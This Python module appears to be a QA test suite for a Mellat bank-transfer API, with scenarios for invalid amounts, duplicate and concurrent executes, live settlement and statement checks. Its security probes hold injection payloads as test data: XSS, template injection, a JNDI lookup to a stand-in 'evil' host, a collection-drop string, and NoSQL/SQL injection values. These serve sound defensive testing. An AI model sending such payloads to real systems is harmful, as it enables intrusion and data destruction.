"""Mellat DSH scenario orchestration (negatives, security, live, statements)."""

from __future__ import annotations

import concurrent.futures

from tests.api.debit.bank_transfer.account_statements import get_account_statements
from tests.api.debit.bank_transfer.provider_statements import (
    ProviderStatementsRequest,
    post_provider_statements,
)
from tests.config.constants import PLATFORM_VERSION_2023
from tests.services.debit import bank_transfer_statements as stmts
from tests.services.debit.bank_transfer import BankTransferContext, BankTransferFlow, title_of
from tests.services.debit.bank_transfer_secrets import (
    require_live_transfer,
)

HOUR_MS = 60 * 60 * 1000
MAX_CLIENT_AMOUNT = 50_000_000_001


def store_dsh_case(flow: BankTransferFlow, ctx: BankTransferContext, case: str) -> None:
    """Dispatch a Mellat DSH When action by business case key."""
    dispatch = {
        "cross-bank iban matrix": store_cross_bank_matrix,
        "owner xss payloads": store_owner_xss,
        "description sql injection": store_description_sql,
        "injection tracking inquiry": store_tracking_injection,
        "oversized payload": store_oversized_payload,
        "decimal amount": store_decimal_amount,
        "negative amount": store_negative_amount,
        "iban with spaces": store_iban_with_spaces,
        "duplicate different amount": store_duplicate_different_amount,
        "duplicate same tracking": store_duplicate_same_tracking,
        "missing iban": store_missing_iban,
        "string amount": store_string_amount,
        "minimum amount": store_minimum_amount,
        "weight switch live transfer": store_weight_switch_live,
        "prod route transfer settle": store_prod_settle,
        "max client amount": store_max_client_amount,
        "concurrent duplicate execute": store_concurrent_duplicate_execute,
        "duplicate execute": store_duplicate_execute,
        "transfer after route": store_transfer_after_route,
        "statements apis smoke": store_statements_apis,
        "creditor statement rows": store_creditor_rows,
        "invalid statements dates": store_invalid_statements_dates,
        "invalid account statement dates": store_invalid_account_dates,
        "live transfer on provider statement": store_live_on_statement,
        "configured done statement amounts": store_configured_done_amounts,
        "statements pagination": store_statements_pagination,
        "live reconcile journey": store_live_reconcile,
    }
    dispatch[case](flow, ctx)


def store_cross_bank_matrix(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Route three foreign IBANs while INTERNAL is pinned."""
    flow.pin_active_gateway()
    secrets = flow.secrets
    foreign = {
        "shahin": secrets.shahin_target_iban,
        "melli": secrets.melli_target_iban,
        "parsian": secrets.parsian_target_iban,
    }
    codes: list[int] = []
    titles: list[str | None] = []
    for label, iban in foreign.items():
        tc = flow.new_tracking_code(f"X-{label[:3].upper()}")
        result = flow.route(
            tc,
            iban=iban,
            description=f"QA|MELLAT|CROSS-{label.upper()}|{tc}",
        )
        codes.append(int(result.get("status_code") or 0))
        titles.append(title_of(result))
        ctx.mongo_doc = flow.find_transfer(tc)
    ctx.probe_codes = codes
    ctx.probe_titles = titles
    ctx.flags["rejected_count"] = len(codes)
    ctx.last_result = {"status_code": codes[-1] if codes else 0, "body": None}


def store_owner_xss(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Owner XSS / template / JNDI / long string probes."""
    flow.pin_active_gateway()
    payloads = [
        "<script>alert(1)</script>",
        "{{7*7}}",
        "${jndi:ldap://evil}",
        "A" * 500,
    ]
    codes: list[int] = []
    titles: list[str | None] = []
    for payload in payloads:
        tc = flow.new_tracking_code("XSS")
        result = flow.route(
            tc,
            owner_name=payload,
            description=f"QA|MELLAT|XSS|{tc}",
        )
        codes.append(int(result.get("status_code") or 0))
        titles.append(title_of(result))
    ctx.probe_codes = codes
    ctx.probe_titles = titles
    ctx.flags["max_status"] = max(codes) if codes else 0
    ctx.last_result = {"status_code": codes[0] if codes else 0, "body": None}


def store_description_sql(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """SQL-ish description must stay below HTTP 500 and not drop collections."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("SQL")
    ctx.tracking_code = tc
    ctx.last_result = flow.route(
        tc,
        description="'; db.ach_transfers.drop(); --",
    )
    ctx.flags["collections_ok"] = bool(flow.routing.db.list_collection_names())


def store_tracking_injection(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Inquiry with injection-style tracking codes must not leak or return 500+."""
    payloads = [
        "QA-DOES-NOT-EXIST-9999",
        ".*",
        "QA-.*",
        '{"$ne":null}',
        "' OR '1'='1",
    ]
    codes: list[int] = []
    leaked = False
    for payload in payloads:
        result = flow.inquiry(payload)
        code = int(result.get("status_code") or 0)
        codes.append(code)
        if code == 200:
            body = result.get("body")
            txs = getattr(body, "transactions", None)
            if txs is None and isinstance(body, dict):
                txs = body.get("transactions")
            if txs:
                leaked = True
    ctx.probe_codes = codes
    ctx.flags["leaked"] = leaked
    ctx.flags["max_status"] = max(codes) if codes else 0


def store_oversized_payload(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Huge owner/description must stay below HTTP 500."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("BIG")
    ctx.tracking_code = tc
    ctx.last_result = flow.route(
        tc,
        owner_name="A" * 5000,
        description="D" * 20000,
    )


def store_decimal_amount(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Decimal amount route — accept or reject, never store 10000.5."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("DEC")
    ctx.tracking_code = tc
    ctx.last_result = flow.route(tc, amount=10000.5, description=f"QA|MELLAT|DEC|{tc}")
    if ctx.last_result.get("status_code") == 200:
        doc = flow.find_transfer(tc)
        ctx.mongo_doc = doc
        txs = (doc or {}).get("transactions") or []
        ctx.stored_amount = txs[0].get("amount") if txs else None


def store_negative_amount(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Negative amount must reject."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("NEG")
    ctx.tracking_code = tc
    ctx.last_result = flow.route(tc, amount=-1)


def store_iban_with_spaces(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Spaced IBAN — accept on Mellat or client-reject."""
    flow.pin_active_gateway()
    iban = flow.secrets.mellat_target_iban
    spaced = " ".join(iban[i : i + 4] for i in range(0, len(iban), 4))
    tc = flow.new_tracking_code("IBANSP")
    ctx.tracking_code = tc
    ctx.last_result = flow.route(tc, iban=spaced)
    ctx.route_result = ctx.last_result


def store_duplicate_different_amount(
    flow: BankTransferFlow, ctx: BankTransferContext
) -> None:
    """Second route with the same tracking code and a different amount."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("DUP-AMT")
    ctx.tracking_code = tc
    first_amount = flow.secrets.marker_amount
    ctx.route_result = flow.route(
        tc, amount=first_amount, description=f"QA|MELLAT|DUP-AMT|{tc}"
    )
    ctx.second_result = flow.route(
        tc, amount=first_amount + 1, description=f"QA|MELLAT|DUP-AMT2|{tc}"
    )
    ctx.last_result = ctx.second_result
    ctx.mongo_count = flow.count_transfers(tc)


def store_duplicate_same_tracking(
    flow: BankTransferFlow, ctx: BankTransferContext
) -> None:
    """Sequential duplicate route keeps one mongo row."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("DUP-DOC")
    ctx.tracking_code = tc
    ctx.route_result = flow.route(tc, description=f"QA|MELLAT|DUP-DOC|{tc}")
    ctx.second_result = flow.route(tc, description=f"QA|MELLAT|DUP-DOC|{tc}")
    ctx.last_result = ctx.second_result
    ctx.mongo_count = flow.count_transfers(tc)


def store_missing_iban(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Empty IBAN must 422 and leave no mongo row."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("NOIBAN")
    ctx.tracking_code = tc
    ctx.last_result = flow.route_raw(
        tracking_code=tc,
        amount=flow.secrets.marker_amount,
        iban="",
        owner_name=flow.secrets.mellat_owner_name,
        description=f"QA|MELLAT|NOIBAN|{tc}",
    )
    ctx.flags["mongo_missing"] = flow.find_transfer(tc) is None


def store_string_amount(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Amount as JSON string — coerce or reject; status below 500."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("AMTSTR")
    ctx.tracking_code = tc
    ctx.last_result = flow.route(
        tc, amount="10001", description=f"QA|MELLAT|AMTSTR|{tc}"
    )
    if ctx.last_result.get("status_code") == 200:
        doc = flow.find_transfer(tc)
        txs = (doc or {}).get("transactions") or []
        ctx.stored_amount = txs[0].get("amount") if txs else None


def store_minimum_amount(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Amount=1 boundary."""
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("MIN1")
    ctx.tracking_code = tc
    ctx.last_result = flow.route(tc, amount=1, description=f"QA|MELLAT|MIN|{tc}")
    if ctx.last_result.get("status_code") == 200:
        doc = flow.find_transfer(tc)
        txs = (doc or {}).get("transactions") or []
        ctx.stored_amount = txs[0].get("amount") if txs else None


def store_weight_switch_live(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Zero weights block, then pin + live settle."""
    require_live_transfer(flow.secrets)
    flow.clear_all_gateway_weights()
    tc_block = flow.new_tracking_code("WT-BLOCK")
    blocked = flow.route(tc_block, amount=flow.secrets.safe_amount)
    ctx.flags["block_status"] = blocked.get("status_code")
    ctx.flags["block_title"] = title_of(blocked)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("WT-LIVE")
    ctx.tracking_code = tc
    flow.route(
        tc,
        amount=flow.secrets.safe_amount,
        description=f"QA|MELLAT|WEIGHT-LIVE|{tc}",
    )
    ctx.last_result = flow.execute(tc)
    ctx.mongo_doc = flow.wait_mongo_settled(tc)
    ctx.flags["mongo_status"] = (ctx.mongo_doc or {}).get("status")
    ctx.flags["client_code"] = (ctx.mongo_doc or {}).get("clientCode")
    txs = (ctx.mongo_doc or {}).get("transactions") or []
    bank_ref = None
    if txs:
        bank_ref = (txs[0].get("payResponse") or {}).get("bankTrackingCode")
    ctx.flags["bank_ref"] = bank_ref


def store_prod_settle(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Pin → route → execute → DONE."""
    require_live_transfer(flow.secrets)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("PROD")
    ctx.tracking_code = tc
    flow.route(
        tc,
        amount=flow.secrets.safe_amount,
        description=f"QA|MELLAT|PROD-E2E|{tc}",
    )
    ctx.last_result = flow.execute(tc)
    ctx.mongo_doc = flow.wait_mongo_settled(tc)
    ctx.flags["mongo_status"] = (ctx.mongo_doc or {}).get("status")
    ctx.flags["client_code"] = (ctx.mongo_doc or {}).get("clientCode")


def store_max_client_amount(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Route above Mellat client maxAmount — reject on route or execute."""
    require_live_transfer(flow.secrets)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("MAXCLI")
    ctx.tracking_code = tc
    routed = flow.route(
        tc,
        amount=MAX_CLIENT_AMOUNT,
        description=f"QA|MELLAT|MAX-CLIENT|{tc}",
    )
    ctx.flags["route_status"] = routed.get("status_code")
    ctx.flags["route_title"] = title_of(routed)
    if routed.get("status_code") == 200:
        executed = flow.execute(tc)
        ctx.flags["transfer_status"] = executed.get("status_code")
        ctx.flags["transfer_title"] = title_of(executed)
        ctx.last_result = executed
    else:
        ctx.last_result = routed


def store_concurrent_duplicate_execute(
    flow: BankTransferFlow, ctx: BankTransferContext
) -> None:
    """Two concurrent executes — exactly one HTTP 200."""
    require_live_transfer(flow.secrets)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("RACE")
    ctx.tracking_code = tc
    flow.route(
        tc,
        amount=flow.secrets.safe_amount,
        description=f"QA|MELLAT|RACE|{tc}",
    )

    def _fire(_: int) -> tuple[int, str | None]:
        result = flow.execute(tc)
        return int(result.get("status_code") or 0), title_of(result)

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
        pairs = list(pool.map(_fire, range(2)))
    ctx.probe_codes = [p[0] for p in pairs]
    ctx.probe_titles = [p[1] for p in pairs]
    doc = flow.find_transfer(tc)
    journals = (doc or {}).get("journals") or []
    ctx.flags["transfer_journal_count"] = sum(
        1 for j in journals if isinstance(j, dict) and j.get("action") == "TRANSFER"
    )
    ctx.mongo_doc = doc


def store_duplicate_execute(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Second execute must be rejected."""
    require_live_transfer(flow.secrets)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("DUP-TX")
    ctx.tracking_code = tc
    flow.route(
        tc,
        amount=flow.secrets.safe_amount,
        description=f"QA|MELLAT|DUP-TX|{tc}",
    )
    ctx.route_result = flow.execute(tc)
    ctx.second_result = flow.execute(tc)
    ctx.last_result = ctx.second_result


def store_transfer_after_route(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """After execute, mongo must leave INITIATED."""
    require_live_transfer(flow.secrets)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("INPROG")
    ctx.tracking_code = tc
    flow.route(
        tc,
        amount=flow.secrets.safe_amount,
        description=f"QA|MELLAT|INPROG|{tc}",
    )
    ctx.last_result = flow.execute(tc)
    ctx.mongo_doc = flow.find_transfer(tc)
    ctx.flags["mongo_status"] = (ctx.mongo_doc or {}).get("status")


def store_statements_apis(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """POST /statements + GET account statements smoke."""
    secrets = flow.secrets
    windows = stmts.smoke_windows()
    try:
        items, from_ms, to_ms = stmts.fetch_provider_resilient(flow, windows)
    except stmts.StatementOutage as exc:
        ctx.flags["outage"] = True
        ctx.flags["outage_reason"] = str(exc)
        return
    ctx.flags["outage"] = False
    ctx.flags["item_count"] = len(items)
    account = get_account_statements(
        flow.client,
        account_id=secrets.mellat_account_id,
        from_ms=from_ms,
        to_ms=to_ms,
        user_id=secrets.user_id,
        forwarded_for=secrets.forwarded_for,
        platform_version=PLATFORM_VERSION_2023,
    )
    ctx.last_result = account
    ctx.flags["status_code"] = account.get("status_code")
    ctx.flags["title"] = title_of(account)


def store_creditor_rows(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Creditor PAYA rows must not have amount=0."""
    try:
        items, _, _ = stmts.fetch_provider_resilient(flow, stmts.smoke_windows())
    except stmts.StatementOutage as exc:
        ctx.flags["outage"] = True
        ctx.flags["outage_reason"] = str(exc)
        ctx.flags["item_count"] = 0
        return
    stmts.assert_no_zero_creditor_amounts(items)
    ctx.flags["outage"] = False
    ctx.flags["creditor_ok"] = True
    ctx.flags["item_count"] = len(items)


def store_invalid_statements_dates(
    flow: BankTransferFlow, ctx: BankTransferContext
) -> None:
    """Inverted provider statement dates → client reject."""
    secrets = flow.secrets
    result = post_provider_statements(
        flow.client,
        ProviderStatementsRequest.model_validate(
            {
                "bankCode": secrets.mellat_bank_code,
                "accountNumber": secrets.mellat_account_number,
                "fromDate": 9999999999999,
                "toDate": 1,
                "page": 0,
                "size": 10,
            }
        ),
        user_id=secrets.user_id,
        forwarded_for=secrets.forwarded_for,
        platform_version=PLATFORM_VERSION_2023,
    )
    ctx.last_result = result
    ctx.flags["status_code"] = result.get("status_code")
    ctx.flags["title"] = title_of(result)


def store_invalid_account_dates(
    flow: BankTransferFlow, ctx: BankTransferContext
) -> None:
    """Inverted account statement dates → client reject."""
    secrets = flow.secrets
    result = get_account_statements(
        flow.client,
        account_id=secrets.mellat_account_id,
        from_ms=1,
        to_ms=9999999999999,
        user_id=secrets.user_id,
        forwarded_for=secrets.forwarded_for,
        platform_version=PLATFORM_VERSION_2023,
    )
    ctx.last_result = result
    ctx.flags["status_code"] = result.get("status_code")
    ctx.flags["title"] = title_of(result)


def store_live_on_statement(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Live settle then appear on provider statement."""
    require_live_transfer(flow.secrets)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("STMT")
    ctx.tracking_code = tc
    flow.route(
        tc,
        amount=flow.secrets.safe_amount,
        description=f"QA|MELLAT|STMT|{tc}",
    )
    flow.execute(tc)
    doc = flow.wait_mongo_settled(tc)
    ctx.mongo_doc = doc
    ctx.flags["mongo_status"] = (doc or {}).get("status")
    ctx.flags["client_code"] = (doc or {}).get("clientCode")
    try:
        stmts.assert_transfer_on_provider(flow, doc or {}, tc, poll=True)
        ctx.flags["outage"] = False
    except stmts.StatementOutage as exc:
        ctx.flags["outage"] = True
        ctx.flags["outage_reason"] = str(exc)


def store_configured_done_amounts(
    flow: BankTransferFlow, ctx: BankTransferContext
) -> None:
    """Audit a configured DONE TC on provider statements."""
    import pytest

    tc = (flow.secrets.mellat_statement_reference_tc or "").strip()
    if not tc:
        # Fall back to newest DONE Mellat INTERNAL QA row.
        doc = flow.routing.db.ach_transfers.find_one(
            {
                "trackingCode": {"$regex": "^QA-MEL"},
                "status": "DONE",
                "clientCode": flow.secrets.mellat_client_code,
            },
            sort=[("creationDate", -1)],
        )
        if doc is None:
            pytest.skip("No DONE Mellat reference transfer for statement amount audit")
        tc = str(doc.get("trackingCode"))
    else:
        doc = flow.find_transfer(tc)
        if doc is None or doc.get("status") != "DONE":
            pytest.skip(f"Reference TC {tc} missing or not DONE in mongo")
    ctx.tracking_code = tc
    ctx.mongo_doc = doc
    ctx.flags["mongo_status"] = (doc or {}).get("status")
    ctx.flags["client_code"] = (doc or {}).get("clientCode")
    try:
        stmts.assert_transfer_on_provider(flow, doc or {}, tc, poll=False)
        ctx.flags["outage"] = False
        ctx.flags["amount_ok"] = True
    except stmts.StatementOutage as exc:
        ctx.flags["outage"] = True
        ctx.flags["outage_reason"] = str(exc)
        ctx.flags["amount_ok"] = False


def store_statements_pagination(
    flow: BankTransferFlow, ctx: BankTransferContext
) -> None:
    """Pagination walk. Skip when UAT ignores page/size or is down."""
    try:
        stmts.assert_pagination_contract(flow)
        ctx.flags["pagination_ok"] = True
        ctx.flags["outage"] = False
    except stmts.StatementOutage as exc:
        ctx.flags["pagination_ok"] = False
        ctx.flags["outage"] = True
        ctx.flags["outage_reason"] = str(exc)


def store_live_reconcile(flow: BankTransferFlow, ctx: BankTransferContext) -> None:
    """Live transfer reconciles mongo + inquiry (+ statement soft)."""
    require_live_transfer(flow.secrets)
    flow.pin_active_gateway()
    tc = flow.new_tracking_code("LIVE-RECON")
    ctx.tracking_code = tc
    flow.route(
        tc,
        amount=flow.secrets.safe_amount,
        description=f"QA|MELLAT|LIVE-RECON|{tc}",
    )
    flow.execute(tc)
    doc = flow.wait_mongo_settled(tc)
    ctx.mongo_doc = doc
    ctx.flags["mongo_status"] = (doc or {}).get("status")
    ctx.flags["client_code"] = (doc or {}).get("clientCode")
    ctx.inquiry_result = flow.inquiry(tc)
    try:
        stmts.assert_transfer_on_provider(flow, doc or {}, tc, poll=True)
        ctx.flags["outage"] = False
    except stmts.StatementOutage as exc:
        ctx.flags["outage"] = True
        ctx.flags["outage_reason"] = str(exc)


